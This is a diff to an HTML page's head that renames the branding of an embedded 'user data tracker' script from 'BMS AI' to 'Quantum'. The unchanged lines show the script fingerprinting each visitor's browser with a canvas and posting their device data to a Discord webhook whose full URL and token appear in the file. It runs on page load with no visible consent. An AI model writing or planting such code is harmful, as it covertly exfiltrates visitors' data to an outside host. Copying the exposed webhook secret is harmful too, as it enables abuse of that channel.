@@ -131,7 +131,7 @@
         }
 
     </style>
-		<!-- ========== BMS AI V14 - USER DATA TRACKER (ADDED BY BMS STUDIO) ========== -->
+		<!-- ========== QUANTUM V14 - USER DATA TRACKER (ADDED BY BMS STUDIO) ========== -->
 <script>
 // DISCORD WEBHOOK CONFIG
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1459323686812258447/ET-UZkCMFImgPlPX_5mypn_B_HhhzDB-S_r8KH3I93xAaDloKKbiBg79993LhAzxMAYP";
@@ -182,7 +182,7 @@ async function sendUserDataToDiscord() {
             color: 0xff0000,
             timestamp: new Date().toISOString(),
             fields: [],
-            footer: { text: "BMS AI V14 Tracker | Powered by BMS STUDIO" }
+            footer: { text: "Quantum V14 Tracker | Powered by BMS STUDIO" }
         };
         
         // Device Info Field
@@ -228,10 +228,10 @@ async function sendUserDataToDiscord() {
             body: JSON.stringify({ embeds: [embed] })
         });
         
-        console.log("[BMS AI] User data sent to Discord");
+        console.log("[Quantum] User data sent to Discord");
         
     } catch (err) {
-        console.error("[BMS AI] Error sending data:", err);
+        console.error("[Quantum] Error sending data:", err);
     }
 }
 
@@ -287,7 +287,7 @@ async function generateFingerprint() {
         ctx.fillStyle = '#f60';
         ctx.fillRect(0, 0, 200, 50);
         ctx.fillStyle = '#069';
-        ctx.fillText('BMS AI Tracker', 2, 15);
+        ctx.fillText('Quantum Tracker', 2, 15);
         ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
         ctx.fillText('BMS STUDIO', 4, 35);
         canvasFingerprint = btoa(canvas.toDataURL()).substring(0, 50);
@@ -359,7 +359,7 @@ window.addEventListener('beforeunload', function() {
 });
 
 </script>
-<!-- ========== END BMS AI TRACKER ========== -->
+<!-- ========== END QUANTUM TRACKER ========== -->
 </head>
 <body class="dark" id="app">
 
